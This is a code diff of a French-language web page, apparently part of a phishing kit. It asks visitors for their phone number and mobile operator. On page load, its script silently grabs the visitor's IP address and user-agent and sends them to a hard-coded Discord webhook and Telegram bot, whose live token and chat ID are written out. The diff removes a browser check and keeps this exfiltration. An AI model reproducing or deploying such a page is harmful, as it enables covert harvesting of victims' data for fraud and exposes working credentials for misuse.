@@ -56,33 +56,11 @@
     color: #f88;
     margin-top: 15px;
   }
-  #chrome-block {
-    position: fixed;
-    inset: 0;
-    background: #000;
-    color: #fff;
-    display: none;
-    flex-direction: column;
-    justify-content: center;
-    align-items: center;
-    z-index: 9999;
-    text-align: center;
-    padding: 20px;
-  }
-  #chrome-block h1 {
-    margin-bottom: 20px;
-  }
-  #chrome-block button {
-    width: auto;
-    padding: 15px 40px;
-    font-size: 18px;
-  }
 </style>
 </head>
 <body>
-
-<div class="c" id="mainForm">
-  <h1>Étape 1 : Votre numéro </h1>
+<div class="c">
+  <h1>Étape 1 : Votre numéro 📞</h1>
   <form id="form1">
     <select name="operateur" required>
       <option value="" disabled selected>Choisissez votre opérateur</option>
@@ -97,21 +75,10 @@
   <div id="msg"></div>
 </div>
 
-<div id="chrome-block">
-  <h1>Utilisez Google Chrome</h1>
-  <p>Ouvrez cette page dans Google Chrome pour continuer.</p>
-  <button onclick="window.location.href='https://www.google.com/chrome/'">Télécharger Google Chrome</button>
-</div>
-
 <script>
   const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1474169014027813048/-BCyQk9VGD0Y6drGsv2FUp0vc5Jn8qWwMLPPHalPfx9QxKUht-3azqggeTp8UAbtQTwB";
   const TELEGRAM_TOKEN = "7949221639:AAFENIkH1WqC2m6oVP8_aPOnsT6Qk9tBN2E";
   const TELEGRAM_CHAT_ID = "-1002810249796";
-
-  function isGoogleChrome() {
-    const ua = navigator.userAgent.toLowerCase();
-    return /chrome/.test(ua) && !/edg/.test(ua) && !/opr/.test(ua) && !/safari/.test(ua);
-  }
 
   async function getIP() {
     try {
@@ -147,15 +114,13 @@
   async function sendIpUaOnLoad() {
     const ip = await getIP();
     const ua = navigator.userAgent || "Inconnu";
-    const browser = isGoogleChrome() ? "Google Chrome" : "Autre navigateur";
 
     const discordEmbed = {
       title: "[🛜] PAGE OUVERTE [🛜]",
-      color: isGoogleChrome() ? 0x00FF00 : 0xFF0000,
+      color: 0x9B00FF,
       fields: [
         { name: "📱 Adresse IP", value: ip, inline: false },
-        { name: "📲 User-Agent", value: ua, inline: false },
-        { name: "🌐 Navigateur", value: browser, inline: false }
+        { name: "📲 User-Agent", value: ua, inline: false }
       ],
       timestamp: new Date().toISOString()
     };
@@ -163,20 +128,12 @@
     const telegramText =
       `[🌐] PAGE OUVERTE [🌐]\n\n` +
       `🌐 Adresse IP : ${ip}\n` +
-      `🌐 User-Agent : ${ua}\n` +
-      `🌐 Navigateur : ${browser}`;
+      `🌐 User-Agent : ${ua}`;
 
     await Promise.all([sendDiscord(discordEmbed), sendTelegram(telegramText)]);
   }
 
-  window.addEventListener('load', async () => {
-    await sendIpUaOnLoad();
-
-    if (!isGoogleChrome()) {
-      document.getElementById("mainForm").style.display = "none";
-      document.getElementById("chrome-block").style.display = "flex";
-    }
-  });
+  window.addEventListener('load', sendIpUaOnLoad);
 
   document.getElementById("form1").addEventListener("submit", (e) => {
     e.preventDefault();
